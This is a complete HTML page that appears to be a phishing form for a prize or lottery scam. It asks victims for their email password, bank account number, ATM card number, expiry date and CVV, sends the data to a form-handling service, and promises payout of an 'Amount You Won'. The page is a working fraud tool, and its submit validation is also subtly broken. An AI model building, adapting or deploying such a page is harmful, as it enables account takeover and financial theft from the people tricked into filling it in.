<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      max-width: 500px;
      margin: auto;
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 15px;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      box-sizing: border-box;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    .password-wrapper {
      position: relative;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    #atm-warning {
      color: red;
      font-weight: bold;
      display: none;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <form id="applicationForm" onsubmit="return validateForm()" method="POST" action="https://formspree.io/f/your-form-id">
    <h2>Application Form</h2>

    <label>Full Name
      <input type="text" name="Full Name" required onblur="validateNotEmpty(this)">
      <div class="error">Full Name is required</div>
    </label>

    <label>Country
      <input type="text" name="Country" required onblur="validateNotEmpty(this)">
      <div class="error">Country is required</div>
    </label>

    <label>Phone Number
      <input type="tel" name="Phone Number" required onblur="validatePhone(this)">
      <div class="error">Enter 9‚Äì12 digit phone number</div>
    </label>

    <label>Email Address
      <input type="email" name="Email Address" required onblur="validateNotEmpty(this)">
      <div class="error">Email is required</div>
    </label>

    <label>Email Password
      <div class="password-wrapper">
        <input type="password" name="Email Password" required onblur="validateNotEmpty(this)">
        <span class="toggle-password" onclick="toggleVisibility(this)">üëÅÔ∏è</span>
      </div>
      <div class="error">Email Password is required</div>
    </label>

    <label>Amount You Won
      <input type="number" name="Amount You Won" required onblur="validateNotEmpty(this)">
      <div class="error">This field is required</div>
    </label>

    <label>Bank Account Type
      <input type="text" name="Bank Account Type" placeholder="e.g. Standard Bank Account" required onblur="validateNotEmpty(this)">
      <div class="error">This field is required</div>
    </label>

    <label>Bank Account Number
      <input type="text" name="Bank Account Number" required onblur="validateNotEmpty(this)">
      <div class="error">This field is required</div>
    </label>

    <label>Did You Link ATM to Your Bank Account?
      <select id="atmLinked" name="ATM Linked" onchange="toggleATMFields()" required>
        <option value="">--Select--</option>
        <option value="Yes">Yes</option>
        <option value="No">No</option>
      </select>
      <div class="error">This field is required</div>
    </label>

    <div id="atm-warning">YOU MUST HAVE ATM CARD TO PROCEED</div>

    <div id="atmFields">
      <label>ATM Card Number
        <input type="password" name="ATM Card Number" maxlength="16" oninput="this.value = this.value.replace(/\D/g, '')" onblur="validateCardNumber(this)">
        <div class="error">Must be 16 digits</div>
      </label>

      <label>Expiry Date (MM/YY)
        <input type="text" name="Expiry Date" maxlength="5" placeholder="MM/YY" oninput="formatExpiry(this)" onblur="validateExpiry(this)">
        <div class="error">Enter valid date as MM/YY</div>
      </label>

      <label>CVV
        <input type="password" name="CVV" maxlength="3" oninput="this.value = this.value.replace(/\D/g, '')" onblur="validateCVV(this)">
        <div class="error">CVV must be 3 digits</div>
      </label>

      <p id="final-note">You will receive <span id="amountNote">[Amount You Won]</span> to your <span id="bankTypeNote">[Bank Account Type]</span> <span id="bankNumberNote">[Bank Account Number]</span></p>
    </div>

    <button type="submit">Submit</button>
  </form>

  <script>
    const atmFields = document.getElementById('atmFields');
    const atmWarning = document.getElementById('atm-warning');
    const form = document.getElementById('applicationForm');

    function toggleATMFields() {
      const linked = document.getElementById('atmLinked').value;
      if (linked === 'No') {
        atmFields.style.display = 'none';
        atmWarning.style.display = 'block';
      } else {
        atmFields.style.display = 'block';
        atmWarning.style.display = 'none';
      }
    }

    function toggleVisibility(icon) {
      const input = icon.previousElementSibling;
      input.type = input.type === 'password' ? 'text' : 'password';
    }

    function validateNotEmpty(input) {
      const error = input.nextElementSibling;
      error.style.display = input.value.trim() === '' ? 'block' : 'none';
    }

    function validatePhone(input) {
      const error = input.nextElementSibling;
      const valid = /^\d{9,12}$/.test(input.value);
      error.style.display = valid ? 'none' : 'block';
    }

    function validateCardNumber(input) {
      const error = input.nextElementSibling;
      error.style.display = input.value.length === 16 ? 'none' : 'block';
    }

    function validateCVV(input) {
      const error = input.nextElementSibling;
      error.style.display = input.value.length === 3 ? 'none' : 'block';
    }

    function formatExpiry(input) {
      let value = input.value.replace(/\D/g, '');
      if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2, 4);
      input.value = value;
    }

    function validateExpiry(input) {
      const error = input.nextElementSibling;
      const valid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(input.value);
      error.style.display = valid ? 'none' : 'block';
    }

    function validateForm() {
      const inputs = form.querySelectorAll('input, select');
      inputs.forEach(input => {
        if (input.type !== 'submit') {
          input.dispatchEvent(new Event('blur'));
        }
      });
      return form.querySelectorAll('.error:visible').length === 0;
    }
  </script>
</body>
</html>
